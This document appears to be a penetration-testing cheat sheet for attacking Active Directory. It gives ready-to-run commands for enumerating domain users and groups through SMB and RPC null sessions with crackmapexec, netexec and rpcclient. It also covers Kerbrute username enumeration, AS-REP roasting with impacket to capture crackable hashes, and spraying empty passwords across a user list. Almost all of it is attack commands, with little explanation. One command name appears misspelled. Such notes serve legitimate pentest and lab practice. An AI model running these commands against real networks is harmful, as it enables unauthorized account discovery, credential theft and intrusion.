# Get the domain users throughout the null sessions
``` shell
crackmapexec smb $IP -u guest -p "" --users
crackmapexec smb $IP -u '' -p "" --users
crackmapexec smb $IP -u guest -p "" --rid-brute
crackmapexec smb $IP -u '' -p "" --rid-brute
netexec smb $IP -u guest -p "" --users
netexec smb $IP -u '' -p "" --users
netexec smb $IP -u guest -p "" --rid-brute
netexec smb $IP -u '' -p "" --rid-brute
```
```shell
rpcclient -U "" -N <target_IP>
```
RPC Commands

```text
> enumdomusers
# ──> every domain user (RID + name)
> enumdomgroups
# ──> every domain group (RID + name)
> enumalsgroups
# ──> built-in local aliases (e.g. Administrators, Users)
> lookupnames BUILTIN\Administrators
# ──> resolve “BUILTIN\Administrators” → SID
> lookupsids S-1-5-32-544
# ──> resolve SID → name
```

# UserName Variation Generator 
[PythonScript](https://github.com/MGamalCYSEC/Active-Directory-Enumeration-and-Attacks/blob/main/AD%20Enumeration/NameVariationGenerator.py)
A Python script that takes an input file containing names, processes each name, and generates the specified variations into an output file. 
```shell
python NameVariationGenerator.py <input_file> <output_file>
```
# Check the usernames list
## From Kali Linux
**Using Kerbrute**
Releases [Link](https://github.com/ropnop/kerbrute/releases/tag/v1.0.3)
```shell
./kerbrute_linux_amd64 userenum -d <Domain.LOCAL> --dc <DC-IP>  users.lst
```
**Perform AS-REP Roasting on a list**
```shell
impacket-GetNPUsers -dc-ip <DomainController_IP>  -no-pass -usersfile <user.lst> -outputfile <output_file> <Domain/>
```
**Check SMB Null Session On a List**
**Using Crackmapexec/netexec**
```shell
crackmapexec smb sauna -u users.lst -p '' --continue-on-success
netpexec smb sauna -u users.lst -p '' --continue-on-success
```

